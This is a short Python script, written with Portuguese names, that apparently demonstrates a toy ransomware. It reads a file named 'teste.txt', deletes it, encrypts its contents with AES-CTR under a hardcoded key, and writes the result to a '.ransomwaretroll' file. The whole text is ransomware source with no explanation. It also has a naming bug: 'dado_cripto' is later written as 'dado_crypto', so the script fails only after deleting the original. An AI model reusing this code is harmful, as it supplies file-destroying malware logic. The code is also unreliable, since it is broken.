import os
import pyaes

nome_arquivo = "teste.txt"
arquivo = open(nome_arquivo, "rb")
dados_arquivo = arquivo.read()
arquivo.close()

os.remove(nome_arquivo)

chave = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(chave)

dado_cripto = aes.encrypt(dados_arquivo)

novo_arquivo = nome_arquivo + ".ransomwaretroll"
novo_arquivo = open(f'{novo_arquivo}', "wb")
novo_arquivo.write(dado_crypto)
novo_arquivo.close()
